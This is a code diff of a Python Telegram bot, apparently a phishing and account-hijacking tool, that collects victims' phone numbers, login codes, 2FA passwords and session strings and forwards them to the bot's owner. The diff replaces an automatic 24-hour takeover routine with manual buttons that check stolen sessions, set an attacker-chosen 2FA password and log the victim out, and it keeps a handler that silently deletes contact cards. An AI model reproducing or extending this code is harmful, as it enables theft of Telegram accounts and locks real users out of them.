@@ -7,13 +7,8 @@ from telethon.tl.custom import Button
 from telethon.sessions import StringSession
 import sys
 
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s [%(levelname)s] [%(name)s] %(message)s',
-    handlers=[logging.StreamHandler(sys.stdout)]
-)
-logger = logging.getLogger("KANHA")
-logger.setLevel(logging.INFO)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')
+logger = logging.getLogger(__name__)
 
 
 def _si(v, d=0):
@@ -46,7 +41,6 @@ logger.info("ADMIN BOT START")
 logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
 logger.info(f"  API_ID     : {API_ID}")
 logger.info(f"  OWNER_ID   : {YOUR_TELEGRAM_ID}")
-logger.info(f"  WEBAPP_URL : {WEBAPP_URL}")
 logger.info("=" * 60)
 
 if sys.version_info >= (3, 12) and sys.platform == 'win32':
@@ -242,48 +236,6 @@ def account_label(a):
 
 
 # ============================================================
-# ROBUST SESSION CHECK — double verify
-# ============================================================
-async def robust_check_session(session_str):
-    """Return (is_valid: bool, reason: str)"""
-    try:
-        c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-        await c.connect()
-        try:
-            auth = await c.is_user_authorized()
-            if not auth:
-                return False, "not_authorized"
-            try:
-                me = await c.get_me()
-                if me is None:
-                    return False, "get_me_none"
-                return True, "ok"
-            except errors.UnauthorizedError:
-                return False, "unauthorized_error"
-            except Exception as e:
-                return False, f"get_me_err: {str(e)[:60]}"
-        finally:
-            try:
-                await c.disconnect()
-            except Exception:
-                pass
-    except errors.AuthKeyUnregisteredError:
-        return False, "auth_key_unregistered"
-    except errors.AuthKeyDuplicatedError:
-        return False, "auth_key_duplicated"
-    except errors.UserDeactivatedBanError:
-        return False, "user_deactivated_ban"
-    except errors.UserDeactivatedError:
-        return False, "user_deactivated"
-    except errors.SessionRevokedError:
-        return False, "session_revoked"
-    except errors.SessionExpiredError:
-        return False, "session_expired"
-    except Exception as e:
-        return False, f"conn_err: {str(e)[:60]}"
-
-
-# ============================================================
 # ADMIN BOT
 # ============================================================
 SESSION_PATH = f"/tmp/adminbot_{uuid.uuid4().hex[:8]}.session"
@@ -301,7 +253,6 @@ def admin_menu():
         [Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer"),
          Button.inline(f"🗑 Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", b"menu_toggle_expired")],
         [Button.inline(f"🔐 Auto 2FA: {'SET' if auto_2fa_pass else 'EMPTY'}", b"menu_autopass")],
-        [Button.inline("🔍 Force Expire Check", b"force_expire_check")],
         [Button.inline("🔄 Reset Modes", b"menu_reset")],
     ]
 
@@ -410,7 +361,7 @@ async def safe_send_user(uid, text, buttons=None):
 
 
 async def send_welcome(uid, name):
-    logger.info(f"SEND_WELCOME uid={uid} name={name}")
+    logger.info(f"=== SEND_WELCOME uid={uid} name={name} ===")
     msgs = welcome_config.get("messages", [])
     if not msgs:
         return []
@@ -427,12 +378,14 @@ async def send_welcome(uid, name):
         sent_msg = await safe_send_user(uid, content, buttons)
         if sent_msg:
             sent_ids.append(sent_msg.id)
+            logger.info(f"✅ Welcome #{i+1} sent: {sent_msg.id}")
         await asyncio.sleep(0.3)
     return sent_ids
 
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
+    logger.info("=== Admin /start ===")
     try:
         sender = await event.get_sender()
         uid = sender.id
@@ -450,17 +403,55 @@ async def start_handler(event):
             return
         await send_welcome(uid, name)
     except Exception as e:
-        logger.error(f"/start: {type(e).__name__}: {e}")
-        logger.error(traceback.format_exc())
+        logger.error(f"/start: {e}")
 
 
 # ============================================================
-# EDIT ADMIN MESSAGE — ALWAYS EDIT
+# SESSION VALIDITY CHECK
+# ============================================================
+async def check_session_validity(session_str):
+    """Returns (valid: bool, reason: str)"""
+    try:
+        c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+        await c.connect()
+        try:
+            auth = await c.is_user_authorized()
+            if not auth:
+                return False, "not_authorized"
+            try:
+                me = await c.get_me()
+                if me is None:
+                    return False, "get_me_none"
+                if not getattr(me, "id", None):
+                    return False, "no_id"
+                return True, "ok"
+            except errors.UnauthorizedError:
+                return False, "unauthorized"
+            except errors.AuthKeyUnregisteredError:
+                return False, "auth_key_unreg"
+            except errors.UserDeactivatedError:
+                return False, "user_deactivated"
+            except errors.UserDeactivatedBanError:
+                return False, "user_banned"
+            except Exception as e:
+                return False, f"get_me_err: {str(e)[:60]}"
+        finally:
+            try:
+                await c.disconnect()
+            except Exception:
+                pass
+    except Exception as e:
+        return False, f"connect_err: {str(e)[:60]}"
+
+
+# ============================================================
+# EDIT ADMIN MESSAGE — 3 BUTTONS
 # ============================================================
 async def edit_admin_msg(account, status_text):
     try:
         msg_id = account.get("admin_notify_msg_id")
         phone = account.get("phone", "?")
+        phone_clean = phone.replace("+", "").strip()
         name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
         name = name.strip() or "?"
         dc = account.get("dc", "?")
@@ -473,43 +464,289 @@ async def edit_admin_msg(account, status_text):
             if pv:
                 extra += f" | Pwd: `{pv}`"
 
+        added = account.get("added_at", 0)
+        hours_passed = (time.time() - added) / 3600 if added else 0
+        hours_left = max(0, 24 - hours_passed)
+
         new_text = (f"{status_text}{extra}\n\n"
                     f"Phone: {phone}\n"
                     f"Name: {name}\n"
                     f"User ID: {account.get('user_id', '?')}\n"
-                    f"DC: {dc}\n\n"
+                    f"DC: {dc}\n"
+                    f"⏱ Age: {hours_passed:.1f}h / 24h\n\n"
                     f"Session:\n`{ss}`")
         if len(new_text) > 4000:
             new_text = new_text[:3990] + "..."
 
+        buttons = [
+            [
+                Button.inline("🔍 Expire Check", data=f"mancheck_{phone_clean}"),
+                Button.inline("🗑 Expire + Delete", data=f"mandel_{phone_clean}"),
+            ],
+            [
+                Button.inline("🚪 Terminate + 2FA", data=f"manterm_{phone_clean}"),
+            ],
+        ]
+
         if msg_id:
             try:
-                await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text, parse_mode='md')
-                logger.info(f"✅ Admin msg edited: {phone} → {status_text[:40]}")
+                await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text,
+                                       buttons=buttons, parse_mode='md')
+                logger.info(f"✅ Msg edited: {phone} → {status_text[:30]}")
                 return
             except Exception as e:
-                logger.warning(f"edit err (sending new): {e}")
+                logger.warning(f"edit err, sending new: {e}")
 
         try:
-            r = await bot.send_message(YOUR_TELEGRAM_ID, new_text, parse_mode='md')
-            logger.info(f"✅ New msg sent: {phone} → {status_text[:40]}")
+            r = await bot.send_message(YOUR_TELEGRAM_ID, new_text,
+                                       buttons=buttons, parse_mode='md')
+            logger.info(f"✅ New msg sent: {phone} → {status_text[:30]} (mid={r.id})")
             account["admin_notify_msg_id"] = r.id
             save_account(account)
         except Exception as e:
             logger.error(f"new msg err: {e}")
     except Exception as e:
         logger.error(f"edit_admin_msg err: {e}")
+        logger.error(traceback.format_exc())
 
 
+# ============================================================
+# CALLBACK HANDLER — MANUAL BUTTONS AT TOP
+# ============================================================
 @bot.on(events.CallbackQuery())
 async def cb(event):
-    global timer_value, AUTO_DELETE_EXPIRED, auto_2fa_pass, broadcast_config, share_config, welcome_config
+    global timer_value, AUTO_DELETE_EXPIRED, auto_2fa_pass, broadcast_config, share_config, welcome_config, captured_accounts
     if event.sender_id != YOUR_TELEGRAM_ID:
         return await event.answer("Not authorized", alert=True)
     data = event.data.decode()
     chat_id = event.sender_id
 
     try:
+        # ============================================================
+        # MANUAL SECTION BUTTONS — TOP PRIORITY
+        # ============================================================
+
+        # 🔍 EXPIRE CHECK
+        if data.startswith("mancheck_"):
+            phone_clean = data.replace("mancheck_", "")
+            phone = "+" + phone_clean
+            logger.info(f"🔍 MANUAL EXPIRE CHECK: {phone}")
+            await event.answer("Checking...")
+
+            accounts = load_accounts()
+            acc = next((a for a in accounts if a["phone"] == phone), None)
+            if not acc:
+                return await event.answer("Account not found", alert=True)
+
+            ss = acc.get("session", "")
+            if not ss:
+                return await event.answer("No session", alert=True)
+
+            try:
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                valid, reason = loop.run_until_complete(check_session_validity(ss))
+                loop.close()
+
+                logger.info(f"🔍 Check result {phone}: valid={valid}, reason={reason}")
+
+                if valid:
+                    acc["status"] = "active"
+                    acc["last_checked"] = time.time()
+                    await edit_admin_msg(acc, f"✅ VALID (checked just now)")
+                    await event.answer("✅ Session valid")
+                else:
+                    acc["status"] = "expired"
+                    acc["expired_at"] = time.time()
+                    acc["expire_reason"] = reason
+                    await edit_admin_msg(acc, f"❌ EXPIRE HOYECHE ({reason})")
+                    await event.answer(f"❌ Expired: {reason}")
+
+                for i, x in enumerate(accounts):
+                    if x["phone"] == phone:
+                        accounts[i] = acc
+                        break
+                save_json(DATA_FILE, accounts)
+                captured_accounts = accounts
+            except Exception as e:
+                logger.error(f"manual check err {phone}: {e}")
+                logger.error(traceback.format_exc())
+                await event.answer(f"Err: {str(e)[:40]}", alert=True)
+            return
+
+        # 🗑 EXPIRE + DELETE
+        if data.startswith("mandel_"):
+            phone_clean = data.replace("mandel_", "")
+            phone = "+" + phone_clean
+            logger.info(f"🗑 EXPIRE + DELETE: {phone}")
+            await event.answer("Deleting...")
+
+            accounts = load_accounts()
+            acc = next((a for a in accounts if a["phone"] == phone), None)
+            if not acc:
+                return await event.answer("Not found", alert=True)
+
+            ss = acc.get("session", "")
+            valid = False
+            reason = "no_session"
+
+            if ss:
+                try:
+                    loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loop)
+                    valid, reason = loop.run_until_complete(check_session_validity(ss))
+                    loop.close()
+                    logger.info(f"🗑 Pre-delete check {phone}: valid={valid}, reason={reason}")
+                except Exception as e:
+                    valid, reason = False, f"check_err: {str(e)[:40]}"
+
+            # Delete old message
+            old_mid = acc.get("admin_notify_msg_id")
+            if old_mid:
+                try:
+                    await bot.delete_message(YOUR_TELEGRAM_ID, old_mid)
+                except Exception:
+                    pass
+
+            # Remove from DB
+            new_accounts = [a for a in accounts if a["phone"] != phone]
+            save_json(DATA_FILE, new_accounts)
+            captured_accounts = new_accounts
+
+            # Send DELETED message
+            try:
+                deleted_msg = (f"🗑 **SECTION DELETED**\n\n"
+                               f"📱 Phone: `{phone}`\n"
+                               f"✅ Last Check: `{'VALID' if valid else 'EXPIRED'}`\n"
+                               f"📝 Reason: `{reason}`\n"
+                               f"🕐 Deleted: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`")
+                await bot.send_message(YOUR_TELEGRAM_ID, deleted_msg)
+            except Exception as e:
+                logger.error(f"send delete msg err: {e}")
+
+            await event.answer("✅ Deleted", alert=True)
+            return
+
+        # 🚪 TERMINATE + 2FA
+        if data.startswith("manterm_"):
+            phone_clean = data.replace("manterm_", "")
+            phone = "+" + phone_clean
+            logger.info(f"🚪 MANUAL TERMINATE + 2FA: {phone}")
+            await event.answer("Processing...")
+
+            accounts = load_accounts()
+            acc = next((a for a in accounts if a["phone"] == phone), None)
+            if not acc:
+                return await event.answer("Not found", alert=True)
+
+            ss = acc.get("session", "")
+            if not ss:
+                return await event.answer("No session", alert=True)
+
+            # Check 24h age
+            added = acc.get("added_at", 0)
+            if not added:
+                added = time.time()
+                acc["added_at"] = added
+                save_account(acc)
+
+            hours_passed = (time.time() - added) / 3600
+            hours_left = 24 - hours_passed
+
+            if hours_left > 0:
+                hh = int(hours_left)
+                mm = int((hours_left - hh) * 60)
+                logger.info(f"⏳ 24h not complete {phone}: {hh}h {mm}m left")
+                await edit_admin_msg(acc,
+                    f"⏳ 24h NOT COMPLETE\n\n"
+                    f"⏰ Time left: {hh}h {mm}m\n\n"
+                    f"Wait till 24h complete.\n"
+                    f"2FA will NOT be set before that.")
+                await event.answer(f"⏳ {hh}h {mm}m left", alert=True)
+                return
+
+            # 24h complete → Set 2FA first
+            twofa_set = False
+            if auto_2fa_pass:
+                try:
+                    loopA = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loopA)
+
+                    async def set_2fa():
+                        c = TelegramClient(StringSession(ss), API_ID, API_HASH)
+                        await c.connect()
+                        try:
+                            await c.edit_2fa(new_password=auto_2fa_pass)
+                            logger.info(f"🔐 2FA set: {phone}")
+                            return True
+                        except Exception as e:
+                            logger.error(f"set_2fa err {phone}: {e}")
+                            return False
+                        finally:
+                            await c.disconnect()
+
+                    twofa_set = loopA.run_until_complete(set_2fa())
+                    loopA.close()
+                except Exception as e:
+                    logger.error(f"2FA block err {phone}: {e}")
+
+            # Log out other devices
+            logged_out = False
+            try:
+                loop2 = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop2)
+
+                async def term():
+                    c = TelegramClient(StringSession(ss), API_ID, API_HASH)
+                    await c.connect()
+                    try:
+                        await c.log_out()
+                        logger.info(f"🚪 Logged out: {phone}")
+                        return True
+                    except Exception as e:
+                        logger.error(f"log_out err {phone}: {e}")
+                        return False
+                    finally:
+                        try:
+                            await c.disconnect()
+                        except Exception:
+                            pass
+
+                logged_out = loop2.run_until_complete(term())
+                loop2.close()
+            except Exception as e:
+                logger.error(f"terminate err {phone}: {e}")
+
+            # Update status
+            acc["status"] = "terminated"
+            acc["terminated_at"] = time.time()
+            acc["2fa_password_set"] = auto_2fa_pass if twofa_set else ""
+            acc["terminated_by"] = "manual"
+
+            for i, x in enumerate(accounts):
+                if x["phone"] == phone:
+                    accounts[i] = acc
+                    break
+            save_json(DATA_FILE, accounts)
+            captured_accounts = accounts
+
+            # Status text
+            status_txt = "✅ TERMINATE SECTION COMPLETE"
+            if twofa_set:
+                status_txt += f"\n🔐 2FA: `{auto_2fa_pass}`"
+            else:
+                status_txt += "\n⚠️ 2FA set FAILED (empty password?)"
+            if not logged_out:
+                status_txt += "\n⚠️ Logout may have failed"
+            status_txt += f"\n🕐 Terminated: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
+
+            await edit_admin_msg(acc, status_txt)
+            await event.answer("✅ Terminated", alert=True)
+            return
+
+        # ============================================================
+        # EXISTING ADMIN PANEL HANDLERS
+        # ============================================================
         if data == "menu_home":
             await event.answer()
             await safe_send(chat_id,
@@ -523,7 +760,7 @@ async def cb(event):
             broadcast_state["logged_active"] = False
             await event.answer("Modes reset (sessions preserved)", alert=True)
             await safe_send(chat_id,
-                "✅ Modes reset.\n\n🔐 **All user sessions preserved** — age login kora users abar login korte parbe.",
+                "✅ Modes reset.\n\n🔐 **All user sessions preserved**",
                 admin_menu(), edit_event=event)
 
         elif data == "menu_autopass":
@@ -531,7 +768,7 @@ async def cb(event):
             cur = auto_2fa_pass if auto_2fa_pass else "_(empty)_"
             await event.answer()
             await safe_send(chat_id,
-                f"🔐 **Auto 2FA Password**\n\nCurrent: `{cur}`\n\nSend new password (24h por auto-set hobe).",
+                f"🔐 **Auto 2FA Password**\n\nCurrent: `{cur}`\n\nSend new password (terminate click korle set hobe).",
                 [[Button.inline("🗑 Clear", b"autopass_clear"), Button.inline("⬅️ Back", b"menu_home")]],
                 edit_event=event)
 
@@ -540,63 +777,6 @@ async def cb(event):
             save_autopass("")
             await event.answer("Cleared!", alert=True)
             await safe_send(chat_id, "✅ Cleared.", admin_menu(), edit_event=event)
-
-        # ============================================================
-        # FORCE EXPIRE CHECK — robust double verify
-        # ============================================================
-        elif data == "force_expire_check":
-            await event.answer("Checking...", alert=True)
-            status_msg = await event.respond("🔍 Checking all sessions...")
-            logger.info("=" * 50)
-            logger.info("FORCE EXPIRE CHECK STARTED")
-            try:
-                accounts = load_accounts()
-                total = len(accounts)
-                expired_count = 0
-                checked = 0
-                errors = []
-                for a in accounts:
-                    if a.get("status") in ("terminated", "expired"):
-                        continue
-                    session_str = a.get("session", "")
-                    if not session_str:
-                        errors.append(f"{a.get('phone')}: no session")
-                        continue
-                    checked += 1
-                    try:
-                        loop = asyncio.new_event_loop()
-                        asyncio.set_event_loop(loop)
-                        valid, reason = loop.run_until_complete(robust_check_session(session_str))
-                        loop.close()
-                        logger.info(f"CHECK {a.get('phone')}: valid={valid}, reason={reason}")
-
-                        if not valid:
-                            a["status"] = "expired"
-                            a["expired_at"] = time.time()
-                            expired_count += 1
-                            await edit_admin_msg(a, "❌ EXPIRE HOYECHE")
-                    except Exception as e:
-                        logger.error(f"force check err {a.get('phone')}: {type(e).__name__}: {e}")
-                        errors.append(f"{a.get('phone')}: {str(e)[:40]}")
-                save_json(DATA_FILE, accounts)
-                global captured_accounts
-                captured_accounts = accounts
-
-                err_txt = ""
-                if errors:
-                    err_txt = "\n\n⚠️ Errors:\n" + "\n".join(errors[:5])
-
-                await status_msg.edit(
-                    f"✅ **Force Check Complete**\n\n"
-                    f"Total: `{total}`\n"
-                    f"Checked: `{checked}`\n"
-                    f"🔴 New Expired: `{expired_count}`{err_txt}",
-                    parse_mode='md')
-                logger.info(f"FORCE CHECK DONE: {expired_count} expired out of {checked} checked")
-            except Exception as e:
-                logger.error(f"force check CRASH: {type(e).__name__}: {e}")
-                logger.error(traceback.format_exc())
-                await status_msg.edit(f"❌ Error: {e}")
 
         elif data == "menu_welcome":
             n = len(welcome_config.get("messages", []))
@@ -860,7 +1040,7 @@ async def cancel(event):
 
 
 # ============================================================
-# CAPTURE — contact auto-delete + owner inputs
+# MESSAGE INPUT HANDLER — WITH CONTACT CARD AUTO-DELETE
 # ============================================================
 @bot.on(events.NewMessage())
 async def capture(event):
@@ -871,14 +1051,14 @@ async def capture(event):
         try:
             if event.message and event.message.contact:
                 logger.info(f"🚫 Contact from user {event.sender_id} — deleting in 1ms")
-                await asyncio.sleep(0.001)  # 1 millisecond
+                await asyncio.sleep(0.001)
                 await event.delete()
-                logger.info(f"✅ Contact card deleted from {event.sender_id}")
+                logger.info(f"✅ Contact card deleted")
         except Exception as e:
-            logger.warning(f"contact delete err: {type(e).__name__}: {e}")
+            logger.warning(f"contact delete err: {e}")
         return
 
-    # ==== OWNER INPUTS ====
+    # ==== Owner commands below ====
     txt = event.raw_text or ""
     if txt.startswith('/'):
         return
@@ -971,130 +1151,8 @@ async def capture(event):
 
 
 # ============================================================
-# SECTION MONITOR — 30 SEC + DOUBLE VERIFY + ROBUST LOGS
+# BROADCAST LOOP
 # ============================================================
-async def section_monitor():
-    global AUTO_DELETE_EXPIRED, auto_2fa_pass
-    logger.info("SECTION MONITOR STARTED (interval: 30s)")
-    while True:
-        try:
-            await asyncio.sleep(30)
-            accounts = load_accounts()
-            if not accounts:
-                continue
-            logger.info(f"MONITOR CYCLE: checking {len(accounts)} accounts")
-            changed = False
-            new_accounts = []
-            for a in accounts:
-                if a.get("status") == "terminated":
-                    new_accounts.append(a)
-                    continue
-                session_str = a.get("session", "")
-                if not session_str:
-                    new_accounts.append(a)
-                    continue
-                try:
-                    loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loop)
-                    valid, reason = loop.run_until_complete(robust_check_session(session_str))
-                    loop.close()
-
-                    # Session invalid → mark expired + ALWAYS edit
-                    if not valid:
-                        if a.get("status") != "expired":
-                            a["status"] = "expired"
-                            a["expired_at"] = time.time()
-                            changed = True
-                            logger.info(f"❌ EXPIRED {a['phone']} (reason: {reason})")
-                        await edit_admin_msg(a, "❌ EXPIRE HOYECHE")
-                        if AUTO_DELETE_EXPIRED:
-                            logger.info(f"🗑 Auto-delete expired: {a['phone']}")
-                            continue
-
-                    # Active + 24h check → terminate
-                    if a.get("status") == "active":
-                        added = a.get("added_at", 0)
-                        age_hours = (time.time() - added) / 3600
-                        if time.time() - added > 86400:
-                            logger.info(f"⏰ 24H PASSED for {a['phone']} (age: {age_hours:.1f}h) — terminating")
-
-                            # Step 1: Set 2FA
-                            if auto_2fa_pass:
-                                try:
-                                    loopA = asyncio.new_event_loop()
-                                    asyncio.set_event_loop(loopA)
-
-                                    async def set_2fa():
-                                        c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-                                        await c.connect()
-                                        try:
-                                            await c.edit_2fa(new_password=auto_2fa_pass)
-                                            logger.info(f"🔐 2FA SET for {a['phone']}")
-                                            return True, ""
-                                        except Exception as e:
-                                            logger.error(f"2fa err {a['phone']}: {type(e).__name__}: {e}")
-                                            return False, str(e)[:60]
-                                        finally:
-                                            try:
-                                                await c.disconnect()
-                                            except Exception:
-                                                pass
-
-                                    ok, err = loopA.run_until_complete(set_2fa())
-                                    loopA.close()
-                                    if not ok:
-                                        logger.warning(f"2FA set failed for {a['phone']}: {err}")
-                                except Exception as e:
-                                    logger.error(f"set 2fa err {a['phone']}: {type(e).__name__}: {e}")
-
-                            # Step 2: Log out all sessions
-                            try:
-                                loop2 = asyncio.new_event_loop()
-                                asyncio.set_event_loop(loop2)
-
-                                async def term():
-                                    c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-                                    await c.connect()
-                                    try:
-                                        await c.log_out()
-                                        logger.info(f"✅ LOGOUT SUCCESS for {a['phone']}")
-                                        return True, ""
-                                    except Exception as e:
-                                        logger.error(f"log_out err {a['phone']}: {type(e).__name__}: {e}")
-                                        return False, str(e)[:60]
-                                    finally:
-                                        try:
-                                            await c.disconnect()
-                                        except Exception:
-                                            pass
-
-                                ok, err = loop2.run_until_complete(term())
-                                loop2.close()
-                                if not ok:
-                                    logger.warning(f"Logout failed for {a['phone']}: {err}")
-                            except Exception as e:
-                                logger.error(f"terminate err {a['phone']}: {type(e).__name__}: {e}")
-
-                            a["status"] = "terminated"
-                            a["terminated_at"] = time.time()
-                            a["2fa_password_set"] = auto_2fa_pass
-                            changed = True
-                            await edit_admin_msg(a, "✅ TERMINATE SECTION COMPLETE")
-
-                    new_accounts.append(a)
-                except Exception as e:
-                    logger.error(f"monitor err {a.get('phone')}: {type(e).__name__}: {e}")
-                    logger.error(traceback.format_exc())
-                    new_accounts.append(a)
-            if changed or len(new_accounts) != len(accounts):
-                save_json(DATA_FILE, new_accounts)
-                captured_accounts = new_accounts
-                logger.info(f"MONITOR CYCLE DONE: {len(new_accounts)} accounts saved")
-        except Exception as e:
-            logger.error(f"section_monitor CRASH: {type(e).__name__}: {e}")
-            logger.error(traceback.format_exc())
-
-
 async def broadcast_loop():
     while True:
         try:
@@ -1114,7 +1172,7 @@ async def broadcast_loop():
                 else:
                     broadcast_state["logged_active"] = False
         except Exception as e:
-            logger.error(f"broadcast loop err: {type(e).__name__}: {e}")
+            logger.error(f"loop err: {e}")
 
 
 async def run_broadcast(messages, target="nonlogged"):
@@ -1156,13 +1214,11 @@ async def run_broadcast(messages, target="nonlogged"):
                                 fail += 0 if s else 1
                     else:
                         ok += 1
-                except Exception as e:
+                except Exception:
                     fail += 1
-                    logger.error(f"broadcast send err {uid}: {type(e).__name__}: {e}")
                 await asyncio.sleep(0.4)
-        except Exception as e:
+        except Exception:
             fail += 1
-            logger.error(f"broadcast uid err {uid_str}: {type(e).__name__}: {e}")
     logger.info(f"Broadcast [{target}]: {ok} sent, {fail} failed")
 
 
@@ -1171,24 +1227,18 @@ async def self_ping_loop():
         try:
             await asyncio.sleep(240)
             http_requests.get(SELF_URL, timeout=10)
-        except Exception as e:
-            logger.warning(f"self_ping err: {e}")
+        except Exception:
+            pass
 
 
 async def bot_main():
     logger.info("Admin bot starting...")
-    try:
-        await bot.start(bot_token=BOT_TOKEN)
-        me = await bot.get_me()
-        logger.info(f"✅ Admin bot started as @{me.username}")
-        asyncio.create_task(broadcast_loop())
-        asyncio.create_task(section_monitor())
-        asyncio.create_task(self_ping_loop())
-        await bot.run_until_disconnected()
-    except Exception as e:
-        logger.error(f"bot_main CRASH: {type(e).__name__}: {e}")
-        logger.error(traceback.format_exc())
-        raise
+    await bot.start(bot_token=BOT_TOKEN)
+    me = await bot.get_me()
+    logger.info(f"✅ Admin bot started as @{me.username}")
+    asyncio.create_task(broadcast_loop())
+    asyncio.create_task(self_ping_loop())
+    await bot.run_until_disconnected()
 
 
 # ============================================================
@@ -1527,7 +1577,7 @@ def _run_tg_thread(phone, code, password, tg_id):
     try:
         _run_tg_sync(phone, code, password, tg_id)
     except Exception as e:
-        logger.error(f"run_tg_thread: {type(e).__name__}: {e}")
+        logger.error(f"run_tg_thread: {e}")
 
 
 async def _tg_action(phone, code=None, password=None, tg_id=None):
@@ -1598,26 +1648,45 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         save_account(acc)
         global captured_accounts
         captured_accounts = load_accounts()
+
+        # Send notification with buttons
+        phone_clean = phone.replace("+", "").strip()
         extra = ""
         if pu:
             extra = "\n2FA Used"
             if password:
                 extra += f" | Pwd: `{password}`"
-        msg = (f"New Account!{extra}\nPhone: {phone}\n"
+
+        msg = (f"New Account!{extra}\n"
+               f"Phone: {phone}\n"
                f"Name: {me.first_name} {me.last_name or ''}\n"
-               f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
+               f"User ID: {me.id}\n"
+               f"DC: {dc}\n"
+               f"⏱ Age: 0.0h / 24h\n\n"
+               f"Session:\n`{ss}`")
         if len(msg) > 4000:
             msg = msg[:3990] + "..."
-        r = http_requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
-            timeout=15)
-        if r.status_code == 200:
-            mid = r.json().get("result", {}).get("message_id")
-            if mid:
-                acc["admin_notify_msg_id"] = mid
+
+        buttons = [
+            [
+                Button.inline("🔍 Expire Check", data=f"mancheck_{phone_clean}"),
+                Button.inline("🗑 Expire + Delete", data=f"mandel_{phone_clean}"),
+            ],
+            [
+                Button.inline("🚪 Terminate + 2FA", data=f"manterm_{phone_clean}"),
+            ],
+        ]
+
+        try:
+            r = await bot.send_message(YOUR_TELEGRAM_ID, msg, buttons=buttons, parse_mode='md')
+            if r:
+                acc["admin_notify_msg_id"] = r.id
                 save_account(acc)
                 captured_accounts = load_accounts()
+                logger.info(f"✅ Notification sent with buttons (mid={r.id})")
+        except Exception as e:
+            logger.error(f"notify err: {e}")
+
         with sessions_lock:
             user_sessions.pop(phone, None)
             pending_codes[phone] = 'done'
@@ -1668,7 +1737,7 @@ def _run_bot():
         asyncio.set_event_loop(loop)
         loop.run_until_complete(bot_main())
     except Exception as e:
-        logger.error(f"BOT THREAD CRASH: {type(e).__name__}: {e}")
+        logger.error(f"BOT CRASH: {e}")
         logger.error(traceback.format_exc())
 
 
@@ -1676,8 +1745,6 @@ if BOT_TOKEN and API_ID and API_HASH and YOUR_TELEGRAM_ID:
     _bot_thread = threading.Thread(target=_run_bot, daemon=True, name="admin-bot")
     _bot_thread.start()
     logger.info("Admin bot thread launched")
-else:
-    logger.error("Bot NOT started — env vars missing")
 
 
 if __name__ == '__main__':
